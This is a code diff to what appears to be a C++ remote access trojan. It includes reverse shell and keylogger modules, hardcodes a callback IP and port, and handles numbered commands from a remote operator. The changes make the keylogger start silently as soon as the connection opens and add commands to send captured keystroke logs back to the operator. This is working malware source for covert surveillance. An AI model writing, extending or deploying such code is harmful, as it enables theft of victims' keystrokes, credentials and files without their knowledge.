@@ -14,7 +14,7 @@
 #include "reverse_shell/ReverseShell.h"
 #include "Keylogger/KeyLogger.h"
 
-#define IP "192.168.82.182"
+#define IP "192.168.1.133"
 
 #define PORT 3055
 
@@ -72,6 +72,7 @@ int main() {
                 Stream stream(sock);
                 ReverseShell reverseShell;
                 KeyLogger keyLogger(stream);
+                keyLogger.tryStart();
                 while (streamListening) {
                     int action = stream.readSize();
                     switch (action) {
@@ -112,8 +113,7 @@ int main() {
                         case 4: {
                             std::cout << "READING ONLY DIRECTORIES" << std::endl;
                             std::string path = stream.readString();
-                            std::string vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path), true,
-                                                                                   false);
+                            std::string vectorOfFiles = FileManager::readDirectory(std::filesystem::u8path(path), true,false);
                             stream.sendString(vectorOfFiles.c_str());
                             break;
                         }
@@ -170,20 +170,33 @@ int main() {
                         }
                         case 12: {
                             std::cout << "START KEYLOGGER" << std::endl;
-                            if (!keyLogger.isRecordingKeys()){
-                                keyLogger.setRecordingKeys(true);
-                                std::thread keyloggerThread(&KeyLogger::start, &keyLogger);
-                                keyloggerThread.detach();
-                            }
+                            keyLogger.tryStart();
                             break;
                         } case 13:{
                             std::cout << "STOP KEYLOGGER" << std::endl;
                             if (keyLogger.isRecordingKeys()) keyLogger.setRecordingKeys(false);
                             break;
                         }
-                        case 14: {
-                            std::cout << "DUMP KEYLOGGER LOGS" << std::endl;
-                            keyLogger.sendKeyLoggerLogs();
+
+                        case 1401: {
+                            std::cout << "DUMP KEYLOGGER LOG" << std::endl;
+                            keyLogger.sendKeyLoggerLog();
+                            break;
+                        }
+                        case 1402: {
+                            std::cout << "DUMP ALL KEYLOGGER LOGS" << std::endl;
+                            keyLogger.sendAllKeyLoggerLogs();
+                            break;
+                        }
+                        case 1403:{
+                            std::cout << "CHECK LAST " << std::endl;
+                            stream.sendSize(keyLogger.lastLogExists());
+                            break;
+                        }
+                        case 1404:{
+                            std::cout << "CHECK ALL " << std::endl;
+                            std::cout << keyLogger.logsExists();
+                            stream.sendSize(keyLogger.logsExists());
                             break;
                         }
                         case 15:{
